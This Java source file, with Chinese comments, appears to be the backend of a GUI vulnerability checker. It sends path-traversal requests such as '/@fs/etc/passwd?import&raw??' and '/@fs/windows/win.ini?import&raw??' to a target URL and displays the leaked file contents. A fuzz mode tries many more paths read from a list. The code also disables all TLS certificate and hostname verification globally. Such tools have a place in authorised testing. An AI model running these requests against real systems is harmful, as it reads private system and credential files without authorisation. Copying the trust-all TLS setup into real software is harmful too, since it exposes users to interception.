package org.example.demo2;

import javafx.scene.control.TextArea;

import javax.net.ssl.*;
import java.io.BufferedReader;
import java.io.FileReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.security.cert.X509Certificate;
import java.net.URL;
import java.net.HttpURLConnection;

public class VulnerabilityValidator {

    public static void disableSSLCertificateValidation() {
        try {
            // 创建一个信任所有证书的 TrustManager
            TrustManager[] trustAllCertificates = new TrustManager[]{
                    new X509TrustManager() {
                        public X509Certificate[] getAcceptedIssuers() {
                            return null;
                        }

                        public void checkClientTrusted(X509Certificate[] certs, String authType) {
                        }

                        public void checkServerTrusted(X509Certificate[] certs, String authType) {
                        }
                    }
            };

            // 安装全局的 SSLContext
            SSLContext sc = SSLContext.getInstance("TLS");
            sc.init(null, trustAllCertificates, new java.security.SecureRandom());
            HttpsURLConnection.setDefaultSSLSocketFactory(sc.getSocketFactory());

            // 设置默认的 HostnameVerifier 来绕过主机名验证
            HostnameVerifier allHostsValid = (hostname, session) -> true;
            HttpsURLConnection.setDefaultHostnameVerifier(allHostsValid);

        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static void sendMaliciousRequestLinux(String url, TextArea outputTextArea) {
        try {
            disableSSLCertificateValidation();
            // 构造恶意 URL
            String maliciousUrl = url + "/@fs/etc/passwd?import&raw??";
            outputTextArea.appendText("发送恶意请求到: " + maliciousUrl + "\n");

            // 创建 URL 对象
            URL targetUrl = new URL(maliciousUrl);
            HttpURLConnection connection = (HttpURLConnection) targetUrl.openConnection();

            // 设置请求方法为 GET
            connection.setRequestMethod("GET");
            connection.setConnectTimeout(5000); // 设置超时时间，避免请求挂起太久
            connection.setReadTimeout(5000); // 设置读取超时时间

            // 获取响应码
            int responseCode = connection.getResponseCode();
            outputTextArea.appendText("响应码: " + responseCode + "\n");

            // 如果响应码是 200（OK），则打印响应内容
            if (responseCode == HttpURLConnection.HTTP_OK) {
                BufferedReader in = new BufferedReader(new InputStreamReader(connection.getInputStream()));
                String inputLine;
                StringBuilder response = new StringBuilder();

                while ((inputLine = in.readLine()) != null) {
                    response.append(inputLine);
                }
                in.close();

                // 格式化输出响应内容
                outputTextArea.appendText("\n==================== 响应内容 ====================\n");
                outputTextArea.appendText("获取的文件内容：\n");
                outputTextArea.appendText(response.toString() + "\n");

                outputTextArea.appendText("===================================================\n\n");
            } else {
                outputTextArea.appendText("漏洞不存在\n");
            }

            connection.disconnect();
        } catch (IOException e) {
            e.printStackTrace();
            outputTextArea.appendText("请求过程中发生错误: " + e.getMessage() + "\n");
        }
    }

    public static void sendMaliciousRequestWindows(String url, TextArea outputTextArea) {
        try {
            disableSSLCertificateValidation();
            // 构造恶意 URL
            String maliciousUrl = url + "/@fs/windows/win.ini?import&raw??";
            outputTextArea.appendText("发送恶意请求到: " + maliciousUrl + "\n");

            // 创建 URL 对象
            URL targetUrl = new URL(maliciousUrl);
            HttpURLConnection connection = (HttpURLConnection) targetUrl.openConnection();

            // 设置请求方法为 GET
            connection.setRequestMethod("GET");
            connection.setConnectTimeout(5000); // 设置超时时间，避免请求挂起太久
            connection.setReadTimeout(5000); // 设置读取超时时间

            // 获取响应码
            int responseCode = connection.getResponseCode();
            outputTextArea.appendText("响应码: " + responseCode + "\n");

            // 如果响应码是 200（OK），则打印响应内容
            if (responseCode == HttpURLConnection.HTTP_OK) {
                BufferedReader in = new BufferedReader(new InputStreamReader(connection.getInputStream()));
                String inputLine;
                StringBuilder response = new StringBuilder();

                while ((inputLine = in.readLine()) != null) {
                    response.append(inputLine);
                }
                in.close();

                // 格式化输出响应内容
                outputTextArea.appendText("\n==================== 响应内容 ====================\n");
                outputTextArea.appendText("获取的文件内容：\n");
                outputTextArea.appendText(response.toString() + "\n");

                outputTextArea.appendText("===================================================\n\n");
            } else {
                outputTextArea.appendText("漏洞不存在\n");
            }

            connection.disconnect();
        } catch (IOException e) {
            e.printStackTrace();
            outputTextArea.appendText("请求过程中发生错误: " + e.getMessage() + "\n");
        }
    }

    public static void sendMaliciousRequestFuzz(String url, TextArea outputTextArea) {
        try {
            disableSSLCertificateValidation();
            // 设置fuzz.txt路径
            String fuzzFilePath = "src/main/java/org/example/demo2/fuzz.txt";  // 当前路径下的fuzz.txt文件

            // 读取fuzz.txt中的路径
            BufferedReader reader = new BufferedReader(new FileReader(fuzzFilePath));
            String line;

            while ((line = reader.readLine()) != null) {
                // 拼接URL和每个路径
                String maliciousUrl = url + "/@fs" + line.trim() + "?import&raw??";  // 拼接用户输入的URL和从fuzz.txt中读取的路径
                outputTextArea.appendText("发送恶意请求到: " + maliciousUrl + "\n");

                // 调用漏洞验证方法
                validateMaliciousRequest(maliciousUrl, outputTextArea);

            }

            reader.close(); // 关闭文件读取流
        } catch (IOException e) {
            outputTextArea.appendText("读取文件或请求过程中发生错误: " + e.getMessage() + "\n");
        }
    }

    // 漏洞验证的函数，每次请求后独立处理
    private static void validateMaliciousRequest(String maliciousUrl, TextArea outputTextArea) {
        try {
            // 创建 URL 对象
            URL targetUrl = new URL(maliciousUrl);
            HttpURLConnection connection = (HttpURLConnection) targetUrl.openConnection();

            // 设置请求方法为 GET
            connection.setRequestMethod("GET");
            connection.setConnectTimeout(5000); // 设置超时时间，避免请求挂起太久
            connection.setReadTimeout(5000); // 设置读取超时时间

            // 获取响应代码
            int responseCode = connection.getResponseCode();
            StringBuilder response = new StringBuilder();

            // 如果响应码是200，读取响应内容并返回
            if (responseCode == 200) {
                // 读取响应内容
                BufferedReader responseReader = new BufferedReader(new InputStreamReader(connection.getInputStream()));
                String responseLine;
                while ((responseLine = responseReader.readLine()) != null) {
                    response.append(responseLine);
                }
                responseReader.close();

                // 输出响应结果
                outputTextArea.appendText("成功访问: " + maliciousUrl + " 响应: " + response.toString() + "\n");
            } else {
                // 输出漏洞不存在
                outputTextArea.appendText(maliciousUrl + " 漏洞不存在, 响应代码: " + responseCode + "\n");
            }
        } catch (IOException e) {
            outputTextArea.appendText("请求过程中发生错误: " + e.getMessage() + "\n");
        }
    }
}
